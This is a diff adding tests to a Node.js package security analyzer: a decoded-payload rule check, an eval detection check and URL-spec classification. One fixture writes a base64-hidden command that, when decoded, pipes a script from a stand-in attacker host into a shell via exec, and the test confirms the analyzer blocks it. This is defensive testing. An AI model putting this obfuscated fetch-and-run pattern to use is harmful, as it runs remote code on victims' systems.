@@ -2,12 +2,13 @@ import test from "node:test";
 import assert from "node:assert/strict";
 import path from "node:path";
 import os from "node:os";
-import { mkdtempSync, existsSync } from "node:fs";
+import { mkdtempSync, writeFileSync, existsSync } from "node:fs";
 import { fileURLToPath } from "node:url";
 import { gunzipSync, gzipSync } from "node:zlib";
 import { analyzePackageDir, verdictFor, renderReportMarkdown } from "../lib/analyzer/index.js";
 import { scoreFindings, DEFAULT_POLICY } from "../lib/analyzer/score.js";
 import { selectVersion, parseVersion, satisfiesClause } from "../lib/analyzer/semver.js";
+import { classifySpec } from "../lib/analyzer/registry.js";
 import { nearMiss, KNOWN_NAMES } from "../lib/analyzer/known.js";
 import { extractTgz } from "../lib/analyzer/tar.js";
 
@@ -154,4 +155,41 @@ test("extractTgz roundtrip + longname + traversal refusal", () => {
 test("gunzip roundtrip sanity", () => {
   const buf = Buffer.from("hello");
   assert.equal(gunzipSync(gzipSync(buf)).toString(), "hello");
+});
+
+test("decoded-payload rule catches base64-hidden exfiltration URL", async () => {
+  const dir = mkdtempSync(path.join(os.tmpdir(), "dsh-decoded-"));
+  writeFileSync(path.join(dir, "package.json"), JSON.stringify({ name: "decoded-http-test", version: "1.0.0", license: "MIT" }));
+  writeFileSync(path.join(dir, "index.js"), [
+    "const { exec } = require('child_process');",
+    "const url = Buffer.from('Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3guc2ggfCBzaA==', 'base64').toString();",
+    "exec('curl -s ' + url + ' | bash');",
+    ""
+  ].join("\n"));
+  const report = await analyzePackageDir(dir, { spec: "decoded-http-test" });
+  const ids = new Set(report.findings.map((f) => f.id));
+  assert.ok(ids.has("decoded-payload"), "decoded-payload missing");
+  const decoded = report.findings.find((f) => f.id === "decoded-payload");
+  assert.equal(decoded.severity, "critical");
+  assert.ok(ids.has("danger-child-process"), "danger-child-process missing");
+  assert.equal(report.verdict, "block");
+});
+
+test("dynamic-construct catches eval/exec with variable arguments", async () => {
+  const dir = mkdtempSync(path.join(os.tmpdir(), "dsh-construct-"));
+  writeFileSync(path.join(dir, "package.json"), JSON.stringify({ name: "construct-test", version: "1.0.0", license: "MIT" }));
+  writeFileSync(path.join(dir, "index.js"), "eval(someVar);\n");
+  const report = await analyzePackageDir(dir, { spec: "construct-test" });
+  const ids = new Set(report.findings.map((f) => f.id));
+  assert.ok(ids.has("dynamic-construct"), "dynamic-construct missing");
+});
+
+test("classifySpec recognizes github https URLs as git", () => {
+  assert.equal(classifySpec("https://github.com/2006spy/dsh-token-billing"), "git");
+  assert.equal(classifySpec("https://github.com/a/b.git"), "git");
+  assert.equal(classifySpec("github:a/b"), "git");
+  assert.equal(classifySpec("https://gitee.com/a/b"), "git");
+  assert.equal(classifySpec("https://example.com/p.tgz"), "url");
+  assert.equal(classifySpec("dsh-plugin-foo@1.0.0"), "registry");
+  assert.equal(classifySpec("./local-dir"), "file");
 });
